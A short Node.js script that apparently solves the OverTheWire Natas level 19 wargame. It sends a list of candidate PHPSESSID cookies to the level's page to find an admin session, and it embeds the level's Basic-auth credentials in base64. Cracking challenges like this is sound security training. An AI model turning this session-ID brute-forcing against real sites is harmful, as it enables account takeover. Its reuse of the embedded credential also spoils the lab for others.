const got = require('got');
const fs = require('fs');

const sessionIds = fs.readFileSync('natas19.tokens.uniq','utf8').split('\r\n'); // there are 640
sessionIds.forEach( (sessionId) => {
  got.get('http://natas19.natas.labs.overthewire.org/index.php?debug', {
    headers: {
      'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
      'Cookie': `PHPSESSID=${sessionId}`}}).then(resp => 
      {
        if (sessionId && !resp.body.includes('regular user')) {
          console.log(`sessionId: ${sessionId} + ${resp.body}`);
        }
      });
});
